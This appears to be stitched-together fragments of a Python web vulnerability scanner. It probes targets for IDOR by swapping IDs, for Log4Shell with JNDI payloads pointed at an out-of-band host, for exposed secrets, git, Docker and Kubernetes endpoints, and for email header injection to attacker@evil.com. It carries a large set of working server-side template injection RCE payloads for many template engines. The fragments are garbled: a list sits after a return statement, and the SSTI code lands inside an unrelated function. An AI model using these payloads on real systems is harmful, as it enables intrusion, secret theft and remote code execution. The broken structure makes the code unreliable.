                r2[2] != baseline[2] and len(r2[2]) > 100):
                findings.append(F("idor","high",test_url,
                    f"BOLA/IDOR: UUID swap returns different user data",
                    original_url=ep, test_url=test_url,
                    original_uuid=uuids[0], test_uuid=test_uuid,
                    poc=f"curl '{test_url}'  # swap UUID → different user data",
                    impact="Broken Object Level Auth -- access other users' data by swapping UUID",
                    remediation="Verify object ownership server-side. Never trust client-supplied IDs.",
                    confidence=72))
                break
    
    # ── Numeric ID IDOR ───────────────────────────────────────────────────────
    NUM_ID_PATTERN = _ire.compile(r'/(\d{1,8})(?:/|$|\?)')
    num_id_eps = [(ep, NUM_ID_PATTERN.findall(ep))
                  for ep in endpoints[:500] if NUM_ID_PATTERN.search(ep)]
    
    for ep, ids in num_id_eps[:30]:
        if not ids: continue
        orig_id = ids[-1]  # use last number
        baseline2 = _get(ep, timeout=6)
        if not baseline2 or baseline2[0] != 200: continue
        
        # Test adjacent IDs
        for delta in [-1, 1, -2, 2, int(orig_id)+1]:
            test_id = str(max(1, int(orig_id) + (delta if isinstance(delta, int) and delta != int(orig_id)+1 else delta)))
            test_url = ep.replace(f"/{orig_id}/", f"/{test_id}/").replace(
                        f"/{orig_id}?", f"/{test_id}?").replace(
                        f"/{orig_id}", f"/{test_id}", 1)
            if test_url == ep: continue
            
            r3 = _get(test_url, timeout=6)
            if not r3 or r3[0] != 200: continue
            if r3[2] != baseline2[2] and len(r3[2]) > 50:
                findings.append(F("idor","high",test_url,
                    f"Numeric IDOR: ID {orig_id} → {test_id} returns different data",
                    original_id=orig_id, test_id=str(test_id),
                    poc=f"curl '{test_url}'  # changed ID {orig_id}→{test_id}",
                    impact="Access other users' data by incrementing/decrementing ID",
                    remediation="Verify ownership server-side. Use non-sequential IDs (UUID).",
                    confidence=68))
                break

    return findings


# ── Auth-aware IDOR ───────────────────────────────────────────────────────────
def check_idor_auth(endpoints: List[str], auth: bool = False) -> List[dict]:
    """IDOR with auth session -- tests both auth and unauth responses."""
    _auth = _tl_auth()   # per-thread auth session
    findings = []
    patterns = [
        (r'/api/v\d+/users?/(\d+)',      "user"),
        (r'/api/v\d+/accounts?/(\d+)',   "account"),
        (r'/api/v\d+/orders?/(\d+)',     "order"),
        (r'/api/v\d+/profiles?/(\d+)',   "profile"),
        (r'/api/v\d+/invoices?/(\d+)',   "invoice"),
        (r'/api/v\d+/documents?/(\d+)',  "document"),
        (r'\?user_?id=(\d+)',            "user_id"),
        (r'\?account_?id=(\d+)',         "account_id"),
        (r'\?customer_?id=(\d+)',        "customer_id"),
        (r'\?order_?id=(\d+)',           "order_id"),
        (r'\?id=(\d+)',                  "generic_id"),
        (r'/users?/(\d+)',               "user"),
        (r'/accounts?/(\d+)',            "account"),
        (r'/profile/(\d+)',              "profile"),
    ]
    seen = set()
    for ep in endpoints[:3000]:
        for pattern, obj_type in patterns:
            m = re.search(pattern, ep, re.I)
            if not m: continue
            base = ep[:m.start()]
            if base in seen: continue
            seen.add(base)
            orig = m.group(1)
            try:
                orig_int = int(orig)
                for test_id in [orig_int+1, orig_int+2, orig_int-1, 1, 2]:
                    if test_id <= 0: continue
                    test_url = ep.replace(orig, str(test_id), 1)
                    r1 = _get(ep, timeout=6)
                    r2 = _get(test_url, timeout=6)
                    if (r1 and r2 and r1[0] == 200 and r2[0] == 200
                            and len(r2[2]) > 100 and r1[2] != r2[2]):
                        if any(k in r2[2].lower() for k in
                               ["id","email","name","user","account","phone"]):
                            findings.append(F("idor","high",ep,
                                f"IDOR: {obj_type} -- sequential ID access",
                                original_id=orig, test_id=str(test_id),
                                object_type=obj_type,
                                poc=f"curl '{test_url}'",
                                impact="Access other users data by changing object ID",
                                confidence=68))
                            break
            except: pass
    return findings


# ── Log4Shell with OOB ────────────────────────────────────────────────────────
def check_log4j_oob(targets: List[str], oob_host: str) -> List[dict]:
    """Log4Shell check with real OOB host."""
    findings = []
    if not oob_host: return findings

    payloads = [
        f"${{jndi:ldap://{oob_host}/log4j-a}}",
        f"${{jndi:dns://{oob_host}/log4j-b}}",
        f"${{${{lower:j}}ndi:ldap://{oob_host}/log4j-c}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{oob_host}/a}}",
        f"${{j${{::}}ndi:ldap://{oob_host}/e}}",
    ]
    headers_to_inject = [
        "User-Agent","X-Forwarded-For","X-Api-Version",
        "Referer","X-Client-IP","CF-Connecting-IP",
        "Accept","Cookie","Authorization",
        "X-Originating-IP","Contact","Location",
    ]
    for url in targets[:30]:
        for payload in payloads[:3]:
            for header in headers_to_inject:
                r = _get(url, headers={header: payload}, timeout=8)
                if r and r[0] == 500:
                    findings.append(F("log4j","critical",url,
                        f"Potential Log4Shell -- server error on JNDI payload in {header}",
                        payload=payload,header=header,
                        oob_host=oob_host,
                        poc=f"curl -H '{header}: {payload}' '{url}'",
                        note="Check interactsh for DNS/HTTP callback confirmation",
                        impact="Unauthenticated RCE -- CVSS 10.0"))
    return findings
    # Java / .NET
    ("/WEB-INF/web.xml",          "critical", ["<web-app","<servlet","<param-value"]),
    ("/web.config",                "critical", ["<connectionStrings","<appSettings","password"]),
    ("/application.properties",   "critical", ["spring.datasource","password","secret","key"]),
    ("/appsettings.json",          "critical", ["ConnectionStrings","Password","ApiKey"]),
    ("/config/database.yml",       "critical", ["password:","host:","username:"]),
    # Apache / Nginx
    ("/.htaccess",                 "high",     ["RewriteRule","Require","AuthType"]),
    ("/.htpasswd",                 "critical", ["$apr1$","$2y$",":{SHA}"]),
    ("/server-status",             "high",     ["Apache Server Status","Total Accesses","CPU Usage"]),
    ("/nginx_status",              "medium",   ["Active connections","server accepts"]),
    # Secrets files
    ("/secrets.json",              "critical", ["secret","password","token","key"]),
    ("/credentials.json",          "critical", ["private_key","client_email","token"]),
    ("/token.json",                "critical", ["access_token","refresh_token","id_token"]),
    ("/auth.json",                 "critical", ["token","secret","password","auth"]),
    ("/database.json",             "critical", ["password","host","username","connection"]),
    # Cloud / infra
    ("/cloudformation.json",       "critical", ["AWSTemplateFormatVersion","Resources"]),
    ("/terraform.tfstate",         "critical", ["terraform_version","resources","sensitive"]),
    ("/.terraform/terraform.tfstate","critical",["terraform_version","sensitive"]),
    # Misc high-value
    ("/clientaccesspolicy.xml",    "medium",   ["cross-domain-access","domain uri"]),
    ("/crossdomain.xml",           "medium",   ["allow-access-from","domain="]),
    ("/config.yaml",               "high",     ["password:","secret:","token:","key:"]),
    ("/config/secrets.yml",        "critical", ["password:","secret_key:","token:"]),


# ── GIT REPOSITORY EXPOSURE ────────────────────────────────────────────────────
def check_git_exposure(url: str) -> List[dict]:
    findings = []
    base = url.rstrip("/")
    tests = [
        ("/.git/HEAD",          ["ref: refs/","HEAD"]),
        ("/.git/config",        ["[core]","repositoryformatversion"]),
        ("/.git/COMMIT_EDITMSG",["feat","fix","chore","bump","merge"]),
        ("/.git/logs/HEAD",     ["commit","checkout"]),
        ("/.git/packed-refs",   ["refs/heads","refs/tags"]),
    ]
    for path, sigs in tests:
        r = _get(base + path, timeout=5)
        if not r or r[0] != 200: continue
        if any(s in r[2] for s in sigs):
            findings.append(F("expose","critical", base + path,
                f"Git repository exposed: {path}",
                endpoint=path, preview=r[2][:300],
                poc="git clone " + base + "/.git repo_dump",
                impact="Full source code disclosure including secrets and credentials",
                remediation="Block /.git/ in web server. Remove .git from web root."))
            break
    return findings


# ── EMAIL HEADER INJECTION ─────────────────────────────────────────────────────
def check_email_injection(endpoints: List[str]) -> List[dict]:
    findings = []
    email_params = ["email","mail","from","to","contact","address","user_email",
                    "sender","recipient","notify","subscribe","newsletter"]
    tested = set()
    PAYLOADS = [
        "test@x.com%0aBCC:attacker@evil.com",
        "test@x.com%0d%0aCC:attacker@evil.com",
        "test@x.com%0aCC:attacker@evil.com",
    ]
    for ep in endpoints[:200]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in email_params:
            if param not in qs: continue
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)
            for payload in PAYLOADS:
                test_qs = dict(urllib.parse.parse_qsl(parsed.query))
                test_qs[param] = payload
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(test_qs)))
                r = _get(test_url, timeout=8)
                base_r = _get(ep, timeout=6)
                if r and r[0] == 200 and base_r and len(r[2]) != len(base_r[2]):
                    findings.append(F("crlf","high", ep,
                        f"Potential email header injection in '{param}'",
                        param=param, payload=payload,
                        poc="curl '" + test_url + "'",
                        impact="Send spam/phishing through victim server",
                        remediation="Strip CRLF chars from all email inputs."))
                    break
    return findings


# ── DOCKER / KUBERNETES API EXPOSURE ──────────────────────────────────────────
def check_docker_k8s(url: str) -> List[dict]:
    findings = []
    base = url.rstrip("/")
    # Docker API
    for path, sigs in [
        ("/v1.41/info",       ["Containers","Images","DockerRootDir"]),
        ("/containers/json",  ["Id","Image","Names","State"]),
        ("/version",          ["ApiVersion","GoVersion"]),
    ]:
        r = _get(base + path, timeout=5)
        if r and r[0] == 200 and any(s in r[2] for s in sigs):
            findings.append(F("expose","critical", base + path,
                f"Docker API exposed: {path}",
                endpoint=path, preview=r[2][:200],
                poc="curl " + base + path,
                impact="Docker daemon control -> container escape -> host root",
                remediation="Never expose Docker API publicly. Bind to unix socket only."))
            break
    # Kubernetes API
    for path, sigs in [
        ("/api",            ["apiVersion","versions"]),
        ("/api/v1/secrets", ["items","Secret"]),
        ("/api/v1/pods",    ["items","Pod"]),
    ]:
        r = _get(base + path, timeout=5)
        if r and r[0] == 200 and any(s in r[2] for s in sigs):
            findings.append(F("expose","critical", base + path,
                f"Kubernetes API exposed: {path}",
                endpoint=path, preview=r[2][:200],
                poc="curl " + base + path,
                impact="K8s secret theft -> lateral movement across cluster",
                remediation="Restrict K8s API with RBAC. Never expose publicly."))
            break

    # ── Engine-specific RCE payloads ─────────────────────────────────────────
    SSTI_RCE_PAYLOADS = [
        # Jinja2 (Python) - subprocess via __mro__
        ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip().decode()}}",
         ["uid=","root","www-data"], "Jinja2"),
        # Jinja2 - lipsum global
        ("{{lipsum.__globals__['os'].popen('id').read()}}",
         ["uid=","root"], "Jinja2"),
        # Jinja2 - cycler
        ("{{cycler.__init__.__globals__.os.popen('id').read()}}",
         ["uid=","root"], "Jinja2"),
        # Jinja2 - config RCE
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
         ["uid=","root"], "Jinja2"),
        # Twig (PHP) - registerUndefinedFilterCallback
        ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
         ["uid=","root"], "Twig"),
        # Freemarker (Java)
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}',
         ["uid=","root"], "Freemarker"),
        # Velocity (Java)
        ('#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
         ["uid=","root"], "Velocity"),
        # Mako (Python)
        ("${__import__('os').popen('id').read()}",
         ["uid=","root"], "Mako"),
        # ERB (Ruby)
        ("<%= `id` %>", ["uid=","root"], "ERB"),
        # Smarty (PHP)
        ("{system('id')}", ["uid=","root"], "Smarty"),
        ("{php}echo shell_exec('id');{/php}", ["uid=","root"], "Smarty"),
        # OGNL (Java - Struts2)
        ("%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec('id'),#b=new java.io.InputStreamReader(#a.getInputStream()),#c=new java.io.BufferedReader(#b),#d=#c.readLine(),#d}",
         ["uid=","root"], "OGNL/Struts2"),
        # Pebble (Java)
        ("{% for i in range(0, 1) %}{{ i.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(i.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}{% endfor %}",
         ["uid=","root"], "Pebble"),
    ]

    # Time-based SSTI detection (when no output reflection)
    SSTI_TIME_PAYLOADS = [
        ("{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}", 5.0, "Jinja2"),
        ("{{config.__class__.__init__.__globals__['os'].popen('sleep 5')}}", 5.0, "Jinja2-config"),
        ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime().exec('sleep 5'))$rt.waitFor()", 5.0, "Velocity"),
    ]

    _rce_tested = set()
    for ep in [url]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs     = urllib.parse.parse_qs(parsed.query)
        except: continue

        for param in list(qs.keys())[:5]:
            key = (ep.split("?")[0], param)
            if key in _rce_tested: continue
            _rce_tested.add(key)

            for payload, sigs, engine_name in SSTI_RCE_PAYLOADS[:8]:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=8)
                if not r: continue
                if any(s.lower() in r[2].lower() for s in sigs):
                    findings.append(F("ssti","critical",ep,
                        f"SSTI RCE ({engine_name}): command output in response",
                        engine=engine_name, param=param, payload=payload[:80],
                        preview=r[2][:300],
                        poc=f"curl '{test}'",
                        impact=f"Server-Side Template Injection in {engine_name} -- full RCE confirmed",
                        remediation="Never pass user input to template render functions. Use sandboxed templates.",
                        confidence=95))
                    break

            # Time-based SSTI
            for payload, delay, engine_name in SSTI_TIME_PAYLOADS[:2]:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                t0 = time.time()
                _get(test, timeout=int(delay)+4)
                elapsed = time.time() - t0
                if elapsed >= delay * 0.8:
                    findings.append(F("ssti","high",ep,
                        f"Time-based SSTI ({engine_name}): {elapsed:.1f}s delay",
                        engine=engine_name, param=param, delay=elapsed,
                        poc=f"curl '{test}'  # note {delay}s delay",
                        impact=f"Likely SSTI in {engine_name} -- time-based confirmation",
                        remediation="Audit all template rendering code for user input injection.",
                        confidence=72, time_based=True))
                    break

    # POST-based SSTI
    for ep in [url]:
        params = _discover_post_params(ep)
        for action, param, _ in params[:3]:
            for payload, sigs, engine_name in SSTI_RCE_PAYLOADS[:4]:
                r = _post_inject(action, param, payload)
                if r and any(s.lower() in r[2].lower() for s in sigs):
                    findings.append(F("ssti","critical",action,
                        f"SSTI RCE via POST ({engine_name}): '{param}'",
                        engine=engine_name, param=param, payload=payload[:80],
                        poc=f"curl -X POST '{action}' -d '{param}={payload}'",
                        impact=f"SSTI in POST parameter -- {engine_name} RCE",
                        remediation="Sanitize all user input before template rendering.",
                        confidence=92))
                    break

    return findings

